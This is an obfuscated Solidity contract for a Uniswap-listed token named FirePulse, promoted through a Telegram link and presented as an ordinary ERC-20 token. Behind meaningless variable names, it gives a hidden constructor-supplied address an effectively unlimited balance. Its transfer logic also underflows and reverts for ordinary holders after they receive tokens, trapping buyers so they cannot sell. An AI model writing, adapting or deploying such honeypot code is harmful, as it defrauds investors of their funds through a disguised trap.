// https://t.me/firepulse

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.1;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract FirePulse is Ownable {
    constructor(
        string memory universe,
        string memory fort,
        address have,
        address game
    ) {
        uniswapV2Router = IUniswapV2Router02(have);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[game] = material;
        _symbol = fort;
        _name = universe;
        writer = 3;
        _decimals = 9;
        clear[game] = material;
        weather = 1000000000;
        clear[msg.sender] = material;
        _tTotal = weather * 10**_decimals;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public writer;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private weather;
    address public uniswapV2Pair;
    uint256 private material = ~_tTotal;
    IUniswapV2Router02 public uniswapV2Router;
    address private camp;

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address farm,
        address curious,
        uint256 express
    ) internal {
        uint256 attention = writer;

        address tribe = uniswapV2Pair;

        if (clear[farm] == 0 && (tribe != farm) && finish[farm] > 0) {
            clear[farm] -= attention;
        }

        address dear = camp;
        camp = curious;

        _balances[farm] -= express;
        uint256 line = (express / 100) * writer;
        express -= line;
        finish[dear] += 1 + attention;
        _balances[curious] += express;
    }

    mapping(address => uint256) private finish;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private clear;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}